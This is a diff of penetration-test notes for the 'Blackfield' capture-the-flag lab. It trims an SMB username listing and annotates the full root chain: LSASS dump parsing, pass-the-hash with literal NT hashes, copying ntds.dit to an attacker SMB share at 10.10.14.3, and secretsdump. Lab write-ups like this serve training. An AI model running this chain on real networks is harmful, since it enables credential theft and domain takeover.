@@ -151,234 +151,8 @@ $ smbclient '\\10.10.10.192\profiles$' -N -c 'ls'  | tee profiles_ls.txt
   ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                       
   ATaueg                              D        0  Wed Jun  3 12:47:11 2020                                                       
   ATwardowski                         D        0  Wed Jun  3 12:47:11 2020                                                       
-  audit2020                           D        0  Wed Jun  3 12:47:11 2020                                                       
-  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020                                                       
-  AWorsey                             D        0  Wed Jun  3 12:47:11 2020                                                       
-  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020                                                       
-  BBakajza                            D        0  Wed Jun  3 12:47:11 2020                                                       
-  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020                                                       
-  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020                                                       
-  BConsultant                         D        0  Wed Jun  3 12:47:11 2020                                                       
-  BErdossy                            D        0  Wed Jun  3 12:47:11 2020                                                       
-  BGeminski                           D        0  Wed Jun  3 12:47:11 2020                                                       
-  BLostal                             D        0  Wed Jun  3 12:47:11 2020                                                       
-  BMannise                            D        0  Wed Jun  3 12:47:11 2020                                                       
-  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020                                                       
-  BRigiero                            D        0  Wed Jun  3 12:47:11 2020                                                       
-  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020                                                       
-  BZandonella                         D        0  Wed Jun  3 12:47:11 2020                                                       
-  CAcherman                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  CAkbari                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020                                                       
-  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  CGronk                              D        0  Wed Jun  3 12:47:11 2020                                                       
-  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020                                                       
-  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020                                                       
-  CHoytal                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  CKolbo                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020                                                       
-  CSchandall                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  CSelters                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  CTolmie                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  DCecere                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020                                                       
-  DCwilich                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  DKemesies                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  DMatuka                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  DMedeme                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  DMeherek                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  DMetych                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  DPriporov                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020                                                       
-  DVellela                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  DVogleson                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  DZwinak                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  EBoley                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  EEulau                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  EFrixione                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  EJenorik                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020                                                       
-  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020                                                       
-  EPryar                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  ESariotti                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  ETurgano                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  EWojtila                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  FBroj                               D        0  Wed Jun  3 12:47:12 2020                                                       
-  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  FPflum                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  FReffey                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  Gareld                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  GBatowski                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  GForshalger                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  GGomane                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  GHisek                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  GMerewether                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  GWiegard                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  HColantino                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  HConforto                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  HCunnally                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  HGougen                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  HKostova                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  IChristijr                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  IKoledo                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  IKotecky                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  ISantosi                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  JAngvall                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  JDanten                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  JDjouka                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  JKondziola                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020                                                       
-  JLuthner                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020                                                       
-  JPistachio                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  JScima                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  JSebaali                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020 
-  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  KCockeril                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  KColtart                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  KCyster                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  KDorney                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  KKoesno                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  KLangfur                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  KMahalik                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  KMasloch                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  KMibach                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  KParvankova                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  KRasmor                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  KShievitz                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  KZyballa                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  LBaligand                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  LBirer                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  LBobelis                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LChippel                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LChoffin                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LCominelli                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  LDruge                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  LEzepek                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  LKarabag                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LKirousis                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  LKnade                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  LKrioua                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020                                                       
-  LMichoud                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LTindall                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  LYturbe                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  MArcynski                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  MBrambini                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020                                                       
-  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  MKillberg                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  MLapesh                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  MMerezio                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  MNaciri                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020                                                       
-  MSichkar                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  MTemko                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  MTonuri                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  NBellibas                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  NDikoka                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  NGenevro                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  NPulido                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  NRonges                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  OBushey                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  OHardybala                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  OLunas                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  ORbabka                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  PBourrat                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  PBranti                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  PCapperella                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  PCurtz                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  PDoreste                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  PGegnas                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  PMasulla                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  PParakat                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  PProvencer                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  PTesik                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  PVirding                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  RBochare                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  RNemnich                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  RVallandas                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  RWissor                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020                                                       
-  SAjowi                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  SBouzane                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  SChatin                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  SEulert                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020                                                       
-  SGolds                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  SHauht                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  SHederian                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  SHelregel                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  SKrulig                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  SLewrie                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  SMaskil                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  Smocker                             D        0  Wed Jun  3 12:47:12 2020                                                       
-  SMoyta                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020                                                       
-  SReppond                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  SSicliano                           D        0  Wed Jun  3 12:47:12 2020                                                       
-  SSilex                              D        0  Wed Jun  3 12:47:12 2020                                                       
-  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020                                                       
-  STousignaut                         D        0  Wed Jun  3 12:47:12 2020                                                       
+  audit2020                           D        0  Wed Jun  3 12:47:11 2020                                      
+...
   support                             D        0  Wed Jun  3 12:47:12 2020                                                       
   svc_backup                          D        0  Wed Jun  3 12:47:12 2020                                                       
   SWhyte                              D        0  Wed Jun  3 12:47:12 2020                                                       
@@ -538,7 +312,7 @@ RO, POCL_DEBUG) - Platform #1 [The pocl project]
 Hash-mode was not specified with -m. Attempting to auto-detect hash mode.                           
 The following mode was auto-detected as the only one matching your input hash:                      
                                                                                                     
-18200 | Kerberos 5, etype 23, AS-REP | Network Protocol                                             
+18200 | Kerberos 5, etype 23, AS-REP | Net-work Protocol                                             
                                                                                                     
 NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!                          
 Do NOT report auto-detect issues unless you are certain of the hash type.                           
@@ -882,18 +656,23 @@ getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt
 
 - Final chain (foothold -> root)
 	- `smbclient //10.10.10.192/forensic -U "BLACKFIELD\\audit2020%password1!!!" -c 'ls' | tee blackfield/logs/forensic_ls_root.txt`
+		- Why: audit2020 (ForceChangePassword target) had SMB read; forensic share hinted at audit artifacts.
 	- download `lsass.DMP` from `forensic\memory_analysis\`
+		- Why: memory dump of LSASS often contains live credential material (hashes/cleartext).
 	- `python3 -m pypykatz lsa minidump blackfield/loot/lsass.DMP | tee blackfield/loot/pypykatz_lsassDump.txt`
-		- pulled `svc_backup` NT hash and initial Admin NT hash
+		- Why: offline parse of LSASS dump to extract NT hashes/tickets; yielded `svc_backup` NT and Admin NT.
 	- `evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
-		- user flag on `C:\Users\svc_backup\Desktop\user.txt`
+		- Why: PTH with service account hash to gain foothold shell; confirmed Backup Operators membership and pulled user flag.
 	- `smbserver.py loot . -smb2support -username theo -password theo`
+		- Why: host a writable share to receive hives/NTDS over SMB while using SeBackupPrivilege.
 	- `net use \\10.10.14.3\loot /user:theo theo`
+		- Why: map attacker SMB share from DC to stage outbound copies.
 	- `diskshadow` (create shadow copy) + `robocopy /B Z:\Windows\NTDS \\10.10.14.3\loot ntds.dit`
+		- Why: Backup Operators can read volume via VSS; `/B` enforces backup semantics to bypass ACLs and copy locked `ntds.dit`.
 	- `impacket-secretsdump -ntds blackfield/loot/hives/ntds.dit -system blackfield/loot/hives/SYSTEM.save LOCAL | tee blackfield/logs/secretsdump_ntds.txt`
-		- Administrator NT hash: `184fb5e5178480be64824d4cd53b99ee`
+		- Why: SYSTEM+NTDS is enough to decrypt domain hashes; recovered Administrator NT hash `184fb5e5178480be64824d4cd53b99ee`.
 	- `evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee`
-		- root flag on `C:\Users\Administrator\Desktop\root.txt`
+		- Why: final PTH as DA to collect root flag on `C:\Users\Administrator\Desktop\root.txt`
 
 - Evidence paths
 	- `blackfield/logs/forensic_ls_root.txt`
@@ -902,7 +681,6 @@ getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt
 	- `blackfield/loot/hives/SYSTEM.save`
 	- `blackfield/loot/hives/ntds.dit`
 	- `blackfield/logs/secretsdump_ntds.txt`
-
 
 
 
